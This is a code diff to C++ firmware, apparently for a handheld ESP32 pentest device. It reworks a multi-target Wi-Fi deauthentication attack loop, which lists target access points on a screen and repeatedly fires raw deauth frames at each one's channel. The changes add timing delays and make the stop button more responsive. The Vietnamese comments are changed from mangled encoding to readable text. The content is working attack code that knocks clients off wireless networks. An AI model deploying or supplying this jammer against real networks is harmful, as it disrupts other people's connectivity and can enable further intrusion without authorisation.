@@ -1090,6 +1090,7 @@ void beaconAttack() {
 // =========================================================================
 
 // 1. ENGINE ÐÁNH MULTI (UI TINH 100% - CH? V? 1 L?N, IN DANH SÁCH M?C TIÊU)
+// 1. ENGINE ĐÁNH MULTI - ƯU TIÊN ỔN ĐỊNH & NHẠY NÚT BẤM
 void execute_multi_bruce_style(const std::vector<wifi_ap_record_t>& targets) {
     if (targets.empty()) {
         displayTextLine("No APs found!");
@@ -1099,7 +1100,7 @@ void execute_multi_bruce_style(const std::vector<wifi_ap_record_t>& targets) {
         return;
     }
 
-    // --- V? UI TINH TRU?C KHI T?N CÔNG ---
+    // --- VẼ UI TĨNH (CHỈ VẼ 1 LẦN DUY NHẤT) ---
     drawMainBorderWithTitle("Multi-Deauth");
     tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
     
@@ -1110,7 +1111,7 @@ void execute_multi_bruce_style(const std::vector<wifi_ap_record_t>& targets) {
     for (size_t i = 0; i < targets.size(); i++) {
         String ssid_str = String((char*)targets[i].ssid);
         if (ssid_str.length() == 0) ssid_str = "HIDDEN";
-        if (ssid_str.length() > 16) ssid_str = ssid_str.substring(0, 16) + ".."; // C?t ch? dài ch?ng tràn màn hình
+        if (ssid_str.length() > 16) ssid_str = ssid_str.substring(0, 16) + "..";
         
         tft.setCursor(10, startY + (i * 18));
         tft.println("- " + ssid_str + " (Ch" + String(targets[i].primary) + ")");
@@ -1118,32 +1119,46 @@ void execute_multi_bruce_style(const std::vector<wifi_ap_record_t>& targets) {
 
     tft.setCursor(10, tftHeight - 20);
     tft.println("Press Back/Esc to Stop");
-    // ------------------------------------
+    // ------------------------------------------
 
-    // N?p d?n
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
 
-    // VÒNG L?P T?N CÔNG (S?CH S?, CPU KHÔNG PH?I GÁNH L?NH V? TFT)
+    // VÒNG LẶP TẤN CÔNG CHÍNH
     while (true) {
         for (const auto &target : targets) {
+            // Chuyển kênh và chuẩn bị frame
             wsl_bypasser_send_raw_frame(&target, target.primary, _default_target);
+            
+            // Nghỉ 20ms để ổn định Radio sau khi nhảy kênh (Rất quan trọng cho C5)
+            vTaskDelay(pdMS_TO_TICKS(20));
 
+            // Bắn 10 đợt gói tin
             for (int i = 0; i < 10; i++) {
                 send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
-                if (check(EscPress)) break;
+                
+                // Kiểm tra nút bấm ngay lập tức trong lúc bắn
+                if (check(EscPress)) goto EXIT_ENGINE;
             }
 
-            // Ngh? 15ms an toàn
-            vTaskDelay(pdMS_TO_TICKS(15));
-            if (check(EscPress)) break;
+            // Nghỉ ngắn giữa các mục tiêu (chia nhỏ để check nút bấm)
+            for (int d = 0; d < 3; d++) {
+                vTaskDelay(pdMS_TO_TICKS(5));
+                if (check(EscPress)) goto EXIT_ENGINE;
+            }
         }
         
-        if (check(EscPress)) break;
-        // Ngh? 100ms vòng l?p l?n
-        vTaskDelay(pdMS_TO_TICKS(100)); 
+        // Nghỉ 100ms sau mỗi chu kỳ quét (chia nhỏ thành 10 lần check nút)
+        for (int d = 0; d < 10; d++) {
+            vTaskDelay(pdMS_TO_TICKS(10));
+            if (check(EscPress)) goto EXIT_ENGINE;
+        }
     }
 
+EXIT_ENGINE:
+    // Thoát an toàn
+    displayTextLine("Stopping Atk...");
     wifi_atk_unsetWifi();
+    delay(500);
     returnToMenu = true;
 }
 
